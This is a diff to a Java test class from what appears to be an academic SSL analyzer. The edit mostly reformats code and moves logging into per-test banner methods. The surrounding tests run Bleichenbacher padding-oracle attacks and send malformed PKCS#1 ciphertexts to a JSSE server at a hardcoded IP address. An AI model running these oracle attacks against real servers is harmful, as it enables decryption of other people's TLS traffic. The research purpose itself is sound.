@@ -6,6 +6,7 @@ import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.JSSE16Oracle;
 import java.io.FileInputStream;
 import java.io.IOException;
+import java.lang.reflect.Method;
 import java.net.SocketException;
 import java.security.InvalidKeyException;
 import java.security.KeyStore;
@@ -24,7 +25,9 @@ import javax.crypto.NoSuchPaddingException;
 import org.apache.log4j.Logger;
 import org.apache.log4j.PropertyConfigurator;
 import org.bouncycastle.jce.provider.BouncyCastleProvider;
+import org.testng.annotations.AfterMethod;
 import org.testng.annotations.BeforeClass;
+import org.testng.annotations.BeforeMethod;
 import org.testng.annotations.Test;
 
 /**
@@ -138,37 +141,32 @@ public class BleichenbacherJSSETest {
     @Test(enabled = false, priority = 1)
     public void standardBleichenbacher() throws SocketException,
             OracleException {
-        logger.info("++++Start Test (JSSE Real - original BB)++++");
         JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 51635);
 
         Bleichenbacher attacker = new Bleichenbacher(encPMS,
                 jsseOracle, true);
         attacker.attack();
-        logger.info("------------------------------");
     }
 
     @Test(enabled = false, priority = 2)
     public void optimizedBleichenbacher() throws SocketException,
             OracleException {
-        logger.info("++++Start Test (JSSE Real - optimized BB)++++");
         JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 51635);
 
         BleichenbacherCrypto12 attacker = new BleichenbacherCrypto12(encPMS,
                 jsseOracle, true);
         attacker.attack();
-        logger.info("------------------------------");
     }
 
     @Test(enabled = true, priority = 2)
     public void sslTriggerOracleTest() throws SocketException,
             OracleException {
-        logger.info("++++ SSL Trigger Oracle Test ++++");
 //        JSSE16Oracle jsseOracle = new JSSE16Oracle("localhost", 55443);
-JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 55443);
+        JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 55443);
 
         byte[][] test;
         byte[] enc;
-        
+
         int counter = 0;
 
         //test invalid PKCS1 messages
@@ -176,42 +174,40 @@ JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 55443);
         for (int i = 0; i < test.length; i++) {
             enc = encryptHelper(test[i], publicKey);
             jsseOracle.checkPKCSConformity(enc);
-            counter ++;
+            counter++;
         }
 
         test = getInvalidPMSlength();
         for (int i = 0; i < test.length; i++) {
             enc = encryptHelper(test[i], publicKey);
             jsseOracle.checkPKCSConformity(enc);
-            counter ++;
+            counter++;
         }
-        
+
         test = getInvalidPMSlength2();
         for (int i = 0; i < test.length; i++) {
             enc = encryptHelper(test[i], publicKey);
             jsseOracle.checkPKCSConformity(enc);
-            counter ++;
+            counter++;
         }
-        
+
         // invalid ssl version number (explicitly taken 128, 129 and 255 to 
         // produce a "byte converstion overflow")
-        int[] x = {0, 1, 2, 3, 4, 128, 129, 255};        
-        for (int i=0; i<x.length; i++) {
-            plainPKCS[plainPKCS.length-48] = (byte)x[i];
+        int[] x = {0, 1, 2, 3, 4, 128, 129, 255};
+        for (int i = 0; i < x.length; i++) {
+            plainPKCS[plainPKCS.length - 48] = (byte) x[i];
             enc = encryptHelper(plainPKCS, publicKey);
             jsseOracle.checkPKCSConformity(enc);
             counter++;
         }
-        
+
         // valid
         enc = encryptHelper(plainPKCS, publicKey);
         jsseOracle.checkPKCSConformity(enc);
-        counter ++;
-        
-        
-        System.out.println("counter: " + counter);
+        counter++;
 
-        logger.info("------------------------------");
+
+        System.out.println("counter: " + counter);
     }
 
     /**
@@ -244,32 +240,45 @@ JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 55443);
         int x = plainPKCS.length - 59;
         byte[][] invalidPMSlengthMessages = new byte[x][plainPKCS.length];
         for (int i = 0; i < x; i++) {
-            invalidPMSlengthMessages[i] = 
+            invalidPMSlengthMessages[i] =
                     Arrays.copyOf(plainPKCS, plainPKCS.length);
             invalidPMSlengthMessages[i][10 + i] = 0x00;
         }
         return invalidPMSlengthMessages;
     }
-    
+
     /**
      *
-     * @return invalid pms length messages (0x00 at a wrong position in the 
-     * pms area)
+     * @return invalid pms length messages (0x00 at a wrong position in the pms
+     * area)
      */
     private byte[][] getInvalidPMSlength2() {
         // 49 invalid messages
         byte[] current = Arrays.copyOf(plainPKCS, plainPKCS.length);
-        for(int i=0; i<49; i++ ) {
-            current[plainPKCS.length-i-1] = 0x01;
+        for (int i = 0; i < 49; i++) {
+            current[plainPKCS.length - i - 1] = 0x01;
         }
         byte[][] invalidPMSlengthMessages = new byte[49][plainPKCS.length];
         invalidPMSlengthMessages[0] = current.clone();
         for (int i = 1; i < 49; i++) {
-            invalidPMSlengthMessages[i] = 
+            invalidPMSlengthMessages[i] =
                     Arrays.copyOf(current, plainPKCS.length);
-            invalidPMSlengthMessages[i][plainPKCS.length-i] = 0x00;
+            invalidPMSlengthMessages[i][plainPKCS.length - i] = 0x00;
         }
         return invalidPMSlengthMessages;
+    }
+
+    @BeforeMethod
+    protected void printMethodBanner(Method method) throws Exception {
+        String testName = method.getName();
+        logger.info("++++Start Test (" + testName + ")++++");
+    }
+
+    @AfterMethod
+    protected void printEndOfMethodBanner(Method method) throws Exception {
+        String testName = method.getName();
+        logger.info("++++End of Test (" + testName + ")++++");
+        logger.info("------------------------------");
     }
 
     /**
